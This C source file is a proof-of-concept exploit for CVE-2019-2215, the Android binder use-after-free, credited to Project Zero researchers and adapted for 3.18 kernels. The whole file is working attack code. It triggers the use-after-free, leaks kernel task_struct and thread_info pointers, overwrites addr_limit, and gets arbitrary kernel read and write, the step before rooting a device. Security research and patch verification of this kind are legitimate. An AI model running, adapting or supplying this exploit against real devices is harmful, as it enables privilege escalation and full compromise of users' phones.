/*
 * POC to gain arbitrary kernel R/W access using CVE-2019-2215
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Jann Horn & Maddie Stone of Google Project Zero
 * Some stuff from Grant Hernandez to achieve root (Oct 15th 2019)
 * Modified by Alexander R. Pruss for 3.18 kernels where WAITQUEUE_OFFSET is 0x98
 *
 * October 2019
*/

#define DELAY_USEC 200000

#define KERNEL_BASE 0xffffffc000000000ul

#define USER_DS 0x8000000000ul
#define BINDER_SET_MAX_THREADS 0x40046205ul
#define MAX_THREADS 3

#define RETRIES 3

#define PROC_KALLSYMS
#define KALLSYMS_CACHING
#define KSYM_NAME_LEN 128

#include <libgen.h>
#include <time.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <stdarg.h>
#include <linux/limits.h>
#include <stddef.h>

#include "debug.h"

#define MAX_PACKAGE_NAME 1024

#define MIN(x, y) ((x) < (y) ? (x) : (y))
#define MAX(x, y) ((x) > (y) ? (x) : (y))

#define BINDER_THREAD_EXIT 0x40046208ul
// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#define BINDER_THREAD_SZ 0x188
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
#define WAITQUEUE_OFFSET (0x98)
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
#define UAF_SPINLOCK 0x10001
#define PAGE 0x1000ul
#define TASK_STRUCT_OFFSET_FROM_TASK_LIST 0xE8

#define message(fmt, args...) PDBG(fmt "\n", ##args)
#define info(fmt, args...) PNFO(fmt "\n", ##args)
#define error(fmt, args...) PERR(fmt "\n", ##args)

int isKernelPointer(unsigned long p) {
    return p >= KERNEL_BASE && p<=0xFFFFFFFFFFFFFFFEul; 
}

int epfd;

int binder_fd;

unsigned long iovec_size(struct iovec *iov, int n)
{
    unsigned long sum = 0;
    for (int i = 0; i < n; i++)
        sum += iov[i].iov_len;
    return sum;
}

unsigned long iovec_max_size(struct iovec *iov, int n)
{
    unsigned long m = 0;
    for (int i = 0; i < n; i++)
    {
        if (iov[i].iov_len > m)
            m = iov[i].iov_len;
    }
    return m;
}

int clobber_data(unsigned long payloadAddress, const void *src, unsigned long payloadLength)
{
    int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
    char *dummyBuffer = malloc(dummyBufferSize);
    if (dummyBuffer == NULL)
        error( "allocating dummyBuffer");

    memset(dummyBuffer, 0, dummyBufferSize);

    message("PARENT: clobbering at 0x%lx", payloadAddress);

    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;  
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        error( "epoll_add");

    unsigned long testDatum = 0;
    unsigned long const testValue = 0xABCDDEADBEEF1234ul;

    struct iovec iovec_array[IOVEC_ARRAY_SZ];
    memset(iovec_array, 0, sizeof(iovec_array));

#define SECOND_WRITE_CHUNK_IOVEC_ITEMS 3

    unsigned long second_write_chunk[SECOND_WRITE_CHUNK_IOVEC_ITEMS * 2] = {
        (unsigned long)dummyBuffer,
        /* iov_base (currently in use) */ // wq->task_list->next
            SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10,
        /* iov_len (currently in use) */ // wq->task_list->prev

        payloadAddress, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
        payloadLength,

        (unsigned long)&testDatum,
        sizeof(testDatum),
    };

    int delta = (UAF_SPINLOCK + sizeof(second_write_chunk)) % PAGE;
    int paddingSize = delta == 0 ? 0 : PAGE - delta;

    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0;                              // spinlock: will turn to UAF_SPINLOCK
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = second_write_chunk;        // wq->task_list->next: will turn to payloadAddress of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to payloadAddress of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = dummyBuffer;               // stuff from this point will be overwritten and/or ignored
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = UAF_SPINLOCK;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_len = payloadLength;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_len = sizeof(testDatum);
    int totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);

    int pipes[2];
    pipe(pipes);
    if ((fcntl(pipes[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");
    if ((fcntl(pipes[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        error( "fork");
    if (fork_ret == 0)
    {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        message("CHILD: Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        message("CHILD: Finished EPOLL_CTL_DEL.");

        char *f = malloc(totalLength);
        if (f == NULL)
            error( "Allocating memory");
        memset(f, 0, paddingSize + UAF_SPINLOCK);
        unsigned long pos = paddingSize + UAF_SPINLOCK;
        memcpy(f + pos, second_write_chunk, sizeof(second_write_chunk));
        pos += sizeof(second_write_chunk);
        memcpy(f + pos, src, payloadLength);
        pos += payloadLength;
        memcpy(f + pos, &testValue, sizeof(testDatum));
        pos += sizeof(testDatum);
        write(pipes[1], f, pos);
        message("CHILD: wrote %lu", pos);
        close(pipes[1]);
        close(pipes[0]);
        exit(0);
    }

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    int b = readv(pipes[0], iovec_array, IOVEC_ARRAY_SZ);

    message("PARENT: readv returns %d, expected %d", b, totalLength);

    if (testDatum != testValue)
        info( "PARENT: **fail** clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
    else
        message("PARENT: clobbering test passed");

    free(dummyBuffer);
    close(pipes[0]);
    close(pipes[1]);

    return testDatum == testValue;
}

int leak_data(void *leakBuffer, int leakAmount,
               unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
               unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p)
{
    unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST + 8;
    unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough
    
    int success = 1;

    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;  
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        error( "epoll_add");

    struct iovec iovec_array[IOVEC_ARRAY_SZ];

    memset(iovec_array, 0, sizeof(iovec_array));

    int delta = (UAF_SPINLOCK + minimumLeak) % PAGE;
    int paddingSize = (delta == 0 ? 0 : PAGE - delta) + PAGE;

    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_len = PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize - PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0;                                /* spinlock: will turn to UAF_SPINLOCK */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (unsigned long *)0xDEADBEEF; /* wq->task_list->next */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = adjLeakAmount;                /* wq->task_list->prev */
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (unsigned long *)0xDEADBEEF; // we shouldn't get to here
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = extraLeakAmount + UAF_SPINLOCK + 8;
    unsigned long totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned long maxLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned char *dataBuffer = malloc(maxLength);

    if (dataBuffer == NULL)
        error( "Allocating %ld bytes", maxLength);

    for (int i = 0; i < IOVEC_ARRAY_SZ; i++)
        if (iovec_array[i].iov_base == (unsigned long *)0xDEADBEEF)
            iovec_array[i].iov_base = dataBuffer;

    int b;
    int pipefd[2];
    int leakPipe[2];
    if (pipe(pipefd))
        error( "pipe");
    if (pipe(leakPipe))
        err(2, "pipe");
    if ((fcntl(pipefd[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");
    if ((fcntl(pipefd[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        error( "fork");
    if (fork_ret == 0)
    {
        /* Child process */
        char childSuccess = 1;
        
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        message("CHILD: Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        message("CHILD: Finished EPOLL_CTL_DEL.");

        unsigned long size1 = paddingSize + UAF_SPINLOCK + minimumLeak;
        message("CHILD: initial portion length 0x%lx", size1);
        char buffer[size1];
        memset(buffer, 0, size1);
        if (read(pipefd[0], buffer, size1) != size1)
            error( "reading first part of pipe");

        memcpy(dataBuffer, buffer + size1 - minimumLeak, minimumLeak);
        
        int badPointer = 0;
        if (memcmp(dataBuffer, dataBuffer + 8, 8))
            badPointer = 1;
        unsigned long addr = 0;
        memcpy(&addr, dataBuffer, 8);

        if (!isKernelPointer(addr)) {
            badPointer = 1;
            childSuccess = 0;
        }
        
        unsigned long task_struct_ptr = 0;

        memcpy(&task_struct_ptr, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
        message("CHILD: task_struct_ptr = 0x%lx", task_struct_ptr);

        if (!badPointer && (extraLeakAmount > 0 || task_struct_plus_8_p != NULL))
        {
            unsigned long extra[6] = {
                addr,
                adjLeakAmount,
                extraLeakAddress,
                extraLeakAmount,
                task_struct_ptr + 8,
                8};
            message("CHILD: clobbering with extra leak structures");
            if (clobber_data(addr, &extra, sizeof(extra))) 
                message("CHILD: clobbered");
            else {
                info("CHILD: **fail** iovec clobbering didn't work");
                childSuccess = 0;
            }
        }

        errno = 0;
        if (read(pipefd[0], dataBuffer + minimumLeak, adjLeakAmount - minimumLeak) != adjLeakAmount - minimumLeak)
            error("leaking");

        write(leakPipe[1], dataBuffer, adjLeakAmount);

        if (extraLeakAmount > 0)
        {
            message("CHILD: extra leak");
            if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount) {
                childSuccess = 0;
                error( "extra leaking");
            }
            write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
            //hexdump_memory(extraLeakBuffer, (extraLeakAmount+15)/16*16);
        }
        if (task_struct_plus_8_p != NULL)
        {
            if (read(pipefd[0], dataBuffer, 8) != 8) {
                childSuccess = 0;
                error( "leaking second field of task_struct");
            }
            message("CHILD: task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
            write(leakPipe[1], dataBuffer, 8);
        }
        write(leakPipe[1], &childSuccess, 1);

        close(pipefd[0]);
        close(pipefd[1]);
        close(leakPipe[0]);
        close(leakPipe[1]);
        message("CHILD: Finished write to FIFO.");
        
        if (badPointer) {
            errno = 0;
            info("CHILD: **fail** problematic address pointer, e.g., %lx", addr);
        }
        exit(0);
    }
    message("PARENT: soon will be calling WRITEV");
    errno = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
    message("PARENT: writev() returns 0x%x", (unsigned int)b);
    if (b != totalLength) {
        info( "PARENT: **fail** writev() returned wrong value: needed 0x%lx", totalLength);
        success = 0;
        goto DONE;
    }

    info("PARENT: Reading leaked data");

    b = read(leakPipe[0], dataBuffer, adjLeakAmount);
    if (b != adjLeakAmount) {
        info( "PARENT: **fail** reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
        success = 0;
        goto DONE;
    }

    if (leakAmount > 0)
        memcpy(leakBuffer, dataBuffer, leakAmount);

    if (extraLeakAmount != 0)
    {
        info("PARENT: Reading extra leaked data");
        b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
        if (b != extraLeakAmount) {
            info( "PARENT: **fail** reading extra leak: read 0x%x needed 0x%x", b, extraLeakAmount);
            success = 0;
            goto DONE;
        }
    }

    if (task_struct_plus_8_p != NULL)
    {
        if (read(leakPipe[0], task_struct_plus_8_p, 8) != 8) {
            info( "PARENT: **fail** reading leaked task_struct at offset 8");
            success = 0;
            goto DONE;
        }
    }
    
    char childSucceeded=0;
    
    read(leakPipe[0], &childSucceeded, 1);
    if (!childSucceeded)
        success = 0;
    

    if (task_struct_ptr_p != NULL)
        memcpy(task_struct_ptr_p, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);

DONE:    
    close(pipefd[0]);
    close(pipefd[1]);
    close(leakPipe[0]);
    close(leakPipe[1]);

    int status;
    wait(&status);
    //if (wait(&status) != fork_ret) error( "wait");

    free(dataBuffer);

    if (success) 
        info("PARENT: leaking successful");
    
    return success;
}

int leak_data_retry(void *leakBuffer, int leakAmount,
               unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
               unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p) {
    int try = 0;
    while (try < RETRIES && !leak_data(leakBuffer, leakAmount, extraLeakAddress, extraLeakBuffer, extraLeakAmount, task_struct_ptr_p, task_struct_plus_8_p)) {
        info("MAIN: **fail** retrying");
        try++;
    }
    if (0 < try && try < RETRIES) 
        info("MAIN: it took %d tries, but succeeded", try);
    return try < RETRIES;        
}

int clobber_data_retry(unsigned long payloadAddress, const void *src, unsigned long payloadLength) {
    int try = 0;
    while (try < RETRIES && !clobber_data(payloadAddress, src, payloadLength)) {
        info("MAIN: **fail** retrying");
        try++;
    }
    if (0 < try && try < RETRIES) 
        info("MAIN: it took %d tries, but succeeded", try);
    return try < RETRIES;        
}


int kernel_rw_pipe[2];

struct kernel_buffer {
    unsigned char pageBuffer[PAGE];
    unsigned long pageBufferOffset;
} kernel_buffer = { .pageBufferOffset = 0 };

void reset_kernel_pipes()
{
    kernel_buffer.pageBufferOffset = 0;
    close(kernel_rw_pipe[0]);
    close(kernel_rw_pipe[1]);
    if (pipe(kernel_rw_pipe))
        error( "kernel_rw_pipe");
}

int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len > PAGE)
        error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], buf, len) != len ||
        read(kernel_rw_pipe[0], (void *)kaddr, len) != len)
    {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len > PAGE)
        error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], (void *)kaddr, len) != len || read(kernel_rw_pipe[0], buf, len) != len)
    {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

/* for devices with randomized thread_info location on stack: thanks to chompie1337 */
unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
    unsigned long kstack_data[16384/8];
    
    info("MAIN: parsing kernel stack to find thread_info");
    if (!leak_data_retry(NULL, 0, kstack, kstack_data, sizeof(kstack_data), NULL, NULL)) 
        error("Cannot leak kernel stack");
    
    for (unsigned int pos = 0; pos < sizeof(kstack_data)/8; pos++)
        if (kstack_data[pos] == USER_DS)
            return kstack+pos*8-8;
        
    return 0;
}

int cve_2019_2215_0x98(uint64_t *current_task_addr)
{
    *current_task_addr = 0;
    info("MAIN: starting exploit for devices with waitqueue at 0x98");

    if (pipe(kernel_rw_pipe))
        error( "kernel_rw_pipe");

    binder_fd = open("/dev/binder", O_RDONLY);
    epfd = epoll_create(1000);

    unsigned long task_struct_plus_8 = 0xDEADBEEFDEADBEEFul;
    unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;

    if (!leak_data_retry(NULL, 0, 0, NULL, 0, &task_struct_ptr, &task_struct_plus_8)) {
        error("Failed to leak data");
    }

    *current_task_addr = task_struct_ptr;

    unsigned long thread_info_ptr;
    
    if (task_struct_plus_8 == USER_DS) {
        info("MAIN: thread_info is in task_struct");
        thread_info_ptr = task_struct_ptr;
    }
    else {
        info("MAIN: thread_info should be in stack");
        thread_info_ptr = find_thread_info_ptr_kernel3(task_struct_plus_8);
        if (thread_info_ptr  == 0)
            error("cannot find thread_info on kernel stack");
    }
    
    info("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
    info("MAIN: thread_info_ptr = %lx", (unsigned long)thread_info_ptr);
    info("MAIN: Clobbering addr_limit");
    unsigned long const src = 0xFFFFFFFFFFFFFFFEul;

    if (!clobber_data_retry(thread_info_ptr + 8, &src, 8)) {
        error("Failed to clobber addr_limit");
    }

    info("MAIN: should have stable kernel R/W now");

    return 0;
}
